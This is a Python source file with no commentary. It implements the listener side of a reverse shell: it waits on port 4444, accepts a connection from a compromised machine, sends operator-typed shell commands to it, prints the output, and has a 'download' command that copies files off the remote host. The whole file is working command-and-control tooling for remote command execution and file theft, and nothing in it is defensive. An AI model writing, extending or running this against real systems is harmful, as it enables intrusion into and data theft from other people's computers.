import socket
import os
from typing import NoReturn

def write_file(path: str, content: bytes) -> str:
    """Helper to write downloaded bytes to a local file."""
    try:
        with open(path, "wb") as file:
            file.write(content)
        return "[+] Download complete"
    except Exception as e:
        return f"[-] Error writing file: {e}"

def main() -> None:
    # Use environment variables with defaults
    host = os.getenv("HOST", "0.0.0.0")
    port = int(os.getenv("PORT", 4444))

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"[+] Listening on {host}:{port}.....")

        conn, addr = server_socket.accept()
        print(f"[+] Connection established from {addr}")

        while True:
            command = input(">>> ").strip()
            if not command:
                continue
            
            conn.send(command.encode())
            
            if command.lower() == "exit":
                print("[*] Closing connection...")
                conn.close()
                break
            
            elif command.startswith("download"):
                try:
                    file_path = command.split(" ", 1)[1]
                    file_content = conn.recv(4096) # Buffer increased for stability
                    msg = write_file(file_path, file_content)
                    print(msg)
                except IndexError:
                    print("[-] Usage: download <filename>")
            
            else:
                response = conn.recv(4096).decode(errors='replace')
                print(response)

    except Exception as e:
        print(f"[-] Server Error: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()
